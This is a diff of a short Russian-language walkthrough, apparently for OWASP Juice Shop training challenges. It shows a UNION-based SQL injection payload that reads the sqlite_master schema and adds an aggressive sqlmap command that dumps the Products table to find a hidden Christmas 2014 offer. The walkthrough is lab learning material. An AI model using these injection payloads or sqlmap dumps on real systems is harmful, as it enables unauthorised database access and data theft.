@@ -49,9 +49,12 @@ Exfiltrate the entire DB schema definition via SQL Injection.
 %'+)+and+1=1)+UNION+SELECT+*,NULL,NULL,NULL,NULL+FROM+sqlite_master-- 
 ```
 добавил UNION и поугадывал количество возвращаемых столбцов, в итоге получил все записи из этой таблицы
-
-
-
+**Order the Christmas special offer of 2014.**
+Я решал через `sqlmap` 
+```
+sqlmap -r ss.req --batch --level=5 --risk=3 --ignore-code=401  -D SQLite -T Products  --dump --threads 10 
+```
+достал id  Christmas special offer of 2014 и после добавил в корзину и закал
 
 
 
